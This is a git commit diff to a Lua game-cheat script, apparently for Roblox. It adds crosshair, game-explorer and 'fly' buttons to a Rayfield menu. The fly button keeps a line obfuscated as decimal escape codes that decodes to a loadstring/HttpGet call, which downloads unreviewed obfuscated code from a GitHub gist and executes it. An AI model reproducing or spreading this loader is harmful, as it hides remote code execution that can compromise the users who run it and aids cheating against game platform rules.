f46c6e3f05f9bd693b962cd3dd08d89bb767a738
kiti-sites <103646253+kiti-sites@users.noreply.github.com>
2025-01-19 00:23:33 -0300

    Update universal.lua

--- universal.lua
+++ universal.lua
@@ -32,11 +32,16 @@ local Tab = Window:CreateTab("Universal", 4483362458)
 local Section = Tab:CreateSection("Sessão")
 
 -- Button: Crosshair
-local Button = Tab:CreateButton({
+Tab:CreateButton({
     Name = "Mira",
     Callback = function()
         local player = game.Players.LocalPlayer
         local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+
+        -- Check if Crosshair already exists
+        if playerGui:FindFirstChild("CrosshairGUI") then
+            playerGui.CrosshairGUI:Destroy()
+        end
 
         -- Create a ScreenGui for the crosshair
         local screenGui = Instance.new("ScreenGui")
@@ -72,13 +77,18 @@ local Button = Tab:CreateButton({
 })
 
 -- Button: Game Explorer
-local Button = Tab:CreateButton({
+Tab:CreateButton({
     Name = "Veja os arquivos do jogo (CAUSA LAG &/OU CRASH)",
     Callback = function()
         -- Create the Explorer GUI
         local function CreateExplorer()
             local player = game.Players.LocalPlayer
             local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+
+            -- Check if Explorer already exists
+            if playerGui:FindFirstChild("AdvancedExplorer") then
+                playerGui.AdvancedExplorer:Destroy()
+            end
 
             local gui = Instance.new("ScreenGui")
             gui.Name = "AdvancedExplorer"
@@ -139,7 +149,6 @@ local Button = Tab:CreateButton({
                 return yOffset
             end
 
-            PopulateExplorer(game)
             contentFrame.CanvasSize = UDim2.new(0, 0, 0, PopulateExplorer(game))
 
             gui.Parent = playerGui
@@ -150,11 +159,13 @@ local Button = Tab:CreateButton({
     end,
 })
 
--- Button: fly?
-local Button = Tab:CreateButton({
+-- Button: Fly
+Tab:CreateButton({
     Name = "Voe (PODE CAUSAR BANIMENTO EM ALGUNS JOGOS OU NO ROBLOX)",
     Callback = function()
+        -- Verify what you are loading here to ensure safety.
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+    end,
 })
 
 -- Load Rayfield Configuration
